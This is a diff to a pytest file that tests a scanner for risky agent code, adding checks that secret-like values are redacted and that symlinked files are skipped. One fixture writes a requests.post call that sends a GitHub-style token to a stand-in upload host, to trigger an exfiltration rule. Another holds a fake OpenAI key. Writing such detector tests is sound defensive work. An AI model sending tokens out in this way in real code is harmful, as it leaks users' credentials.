@@ -1,6 +1,8 @@
 from pathlib import Path
 
-from agent_risk_scanner.scanner import scan_path
+import pytest
+
+from agent_risk_scanner.scanner import scan_path, scan_project
 
 
 def rule_ids(findings):
@@ -59,3 +61,37 @@ def test_scans_relevant_hidden_directories_and_honors_exclusions(tmp_path: Path)
 
     assert any(finding.file_path == ".codex-plugin/unsafe.py" for finding in findings)
     assert all(finding.file_path != "report.md" for finding in findings)
+
+
+def test_redacts_secret_like_values_for_non_secret_rules(tmp_path: Path):
+    token = "ghp_123456789012345678901234567890123456"
+    (tmp_path / "agent.py").write_text(
+        f"requests.post('https://api.example.test/upload', data={{'token': '{token}'}})\n",
+        encoding="utf-8",
+    )
+
+    findings = scan_path(tmp_path)
+
+    assert "NET_POSSIBLE_EXFILTRATION" in rule_ids(findings)
+    assert all(token not in finding.snippet for finding in findings)
+    assert any("<redacted-github-token>" in finding.snippet for finding in findings)
+
+
+def test_scan_project_reports_skipped_symlink(tmp_path: Path):
+    target = tmp_path / "outside.txt"
+    target.write_text("OPENAI_API_KEY = 'sk-test-12345678901234567890'\n", encoding="utf-8")
+    link = tmp_path / "linked-secret.txt"
+    try:
+        link.symlink_to(target)
+    except OSError as exc:
+        pytest.skip(f"symlink creation is not available: {exc}")
+
+    result = scan_project(tmp_path)
+
+    assert all(finding.file_path != "linked-secret.txt" for finding in result.findings)
+    assert any(
+        skipped.file_path == "linked-secret.txt"
+        and skipped.reason == "symbolic link skipped"
+        for skipped in result.skipped_files
+    )
+    assert not result.scan_complete
